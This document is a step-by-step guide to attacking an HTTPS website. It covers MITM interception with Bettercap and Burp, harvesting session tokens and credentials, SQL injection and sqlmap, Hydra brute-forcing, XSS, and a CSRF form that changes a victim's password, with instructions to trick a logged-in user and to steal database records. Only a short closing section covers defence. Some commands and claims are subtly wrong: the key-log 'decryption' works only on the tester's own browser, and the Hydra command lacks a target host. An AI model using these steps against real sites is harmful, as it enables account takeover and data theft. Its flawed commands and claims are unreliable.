### **Network Penetration Testing on a Secured Website (HTTPS/Encrypted Network)**

This guide provides a step-by-step approach to performing network penetration testing on a secured website, including interception, decryption, analysis, and exploitation.

## **Phase 1: Intercepting & Decrypting HTTPS Traffic**  
Most modern websites use TLS encryption to secure traffic. To analyze and manipulate this encrypted traffic, you need to intercept and decrypt it.

### **1. Set Up a Man-in-the-Middle (MITM) Proxy**  
Burp Suite, MITMproxy, or Bettercap can be used for this.

#### **Method 1: Using Burp Suite**  
1. Install Burp Suite:  
   ```bash
   sudo apt install burpsuite
   ```
2. Set up Burp Proxy:  
   - Open Burp Suite → Go to **Proxy > Options**.  
   - Set the **proxy listener** to `127.0.0.1:8080`.  
   - Install **Burp’s CA certificate** in the browser:  
     - Go to `http://burp` and download the CA certificate.  
     - Import it into your browser’s **Trusted Root Certificates**.  
3. Intercept Traffic:  
   - Enable **Intercept** in **Burp Proxy**.  
   - Browse the target website while using **Burp’s proxy settings**.  
   - Capture encrypted HTTPS requests.

#### **Method 2: Using Bettercap**  
1. Install Bettercap:  
   ```bash
   sudo apt install bettercap
   ```
2. Start MITM Attack on HTTPS Traffic:  
   ```bash
   sudo bettercap -iface wlan0
   ```
3. Enable HTTPS Downgrade (if possible):  
   ```bash
   set https.proxy true
   ```
4. Capture Traffic:  
   ```bash
   net.sniff on
   ```

If the site uses **HSTS (HTTP Strict Transport Security)**, HTTPS downgrade attacks will not work. In that case, a browser-level proxy like Burp or MITMproxy is required.

---

### **2. Decrypting TLS Traffic**  
If traffic is encrypted using TLS, use Wireshark to decrypt it.

#### **Using Wireshark for Decryption**  
1. Export SSL/TLS session keys:  
   ```bash
   export SSLKEYLOGFILE=~/sslkeys.log
   ```
2. Open Wireshark → `Edit > Preferences > Protocols > TLS`  
3. Load the SSL keys (`sslkeys.log`).  
4. Wireshark will now decrypt HTTPS traffic in real time.

---

## **Phase 2: Analyzing Captured Data**  
After intercepting traffic, analyze it for sensitive data, API requests, and authentication vulnerabilities.

### **1. Extract Login Credentials**  
Look for **HTTP headers** containing:  
- Session tokens (JWT, OAuth)  
- Authorization headers  
- Cookies (`sessionid=xyz`)  

Use Burp Suite’s **HTTP History** or Wireshark’s **Follow TCP Stream** to inspect intercepted requests.

---

### **2. Analyze API Requests**  
1. Look for **hidden API endpoints**:  
   - Example: `/api/v1/user/info`  
2. Check for **insecure authentication** (e.g., weak JWT tokens).  
3. Attempt **API abuse** (brute force, parameter tampering).

---

### **3. Capture and Replay Requests**  
Using Burp Suite:  
1. Right-click on a request → Send to **Repeater**.  
2. Modify parameters (`id=1` → `id=2`).  
3. Send the request and observe **server responses**.

---

## **Phase 3: Exploiting the Target**  
Once the website’s traffic has been analyzed, vulnerabilities can be exploited.

### **1. SQL Injection**  
- Modify GET/POST parameters:  
  ```sql
  ' OR 1=1 --
  ```
- Use SQLMap:  
  ```bash
  sqlmap -u "https://target.com/login.php?id=1" --dbs
  ```

---

### **2. Exploiting Broken Authentication**  
#### **Session Hijacking**  
- Capture a session token (`sessionid=xyz123`).  
- Inject the session ID into your browser using a cookie editor.

#### **Brute Force Login**  
Use Hydra:  
```bash
hydra -l admin -P passwords.txt https-post-form "/login.php:user=^USER^&pass=^PASS^:Incorrect password"
```

---

### **3. Cross-Site Scripting (XSS)**  
Inject JavaScript into input fields:  
```html
<script>alert(1)</script>
```

---

### **4. Cross-Site Request Forgery (CSRF)**  
1. Capture a **POST request** (e.g., password change).  
2. Create a **malicious HTML form**:  
   ```html
   <form action="https://target.com/change-password" method="POST">
     <input type="hidden" name="new_password" value="hacked123">
     <input type="submit">
   </form>
   ```
3. Trick a logged-in user into submitting it.

---

### **5. Exploiting SSL/TLS Weaknesses**  
Check for **weak encryption**:  
```bash
sslscan https://target.com
```
Run **testssl.sh**:  
```bash
./testssl.sh https://target.com
```

---

## **Phase 4: Post-Exploitation**  
Once inside, escalate access:  
1. **Privilege escalation** (find weak admin pages).  
2. **Lateral movement** (access other accounts).  
3. **Data exfiltration** (steal database records).

---

## **Phase 5: Defending Against These Attacks**  
To secure a system against these attacks:  
- Use TLS 1.3 (disable older versions).  
- Enable HSTS to prevent HTTPS downgrade attacks.  
- Implement strong authentication (2FA, rate limiting).  
- Sanitize user input (prevent SQLi, XSS).  

---

## **Summary**  
- Intercept HTTPS traffic using Burp Suite or Bettercap  
- Decrypt TLS traffic with Wireshark  
- Analyze captured data for credentials & API abuse  
- Exploit authentication flaws, XSS, SQLi, CSRF  
- Attack weak encryption & escalate privileges 
